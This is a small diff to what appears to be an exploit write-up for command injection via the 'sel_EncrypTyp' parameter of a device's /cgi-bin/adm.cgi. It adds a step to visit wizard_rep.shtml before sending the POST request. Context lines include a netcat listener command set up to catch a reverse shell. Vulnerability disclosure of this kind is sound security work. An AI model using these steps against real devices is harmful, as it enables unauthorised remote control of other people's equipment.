@@ -84,9 +84,9 @@ After successful login, the `sel_EncrypTyp` parameter (extracted from POST reque
 nc -lvnp 1234
 ```
 
-#### 2. Send  POST Request:
+#### 2. Visit wizard_rep.shtml and Send  POST Request:
 
-
+Visit wizard_rep.shtml
 
 ```
 POST /cgi-bin/adm.cgi HTTP/1.1
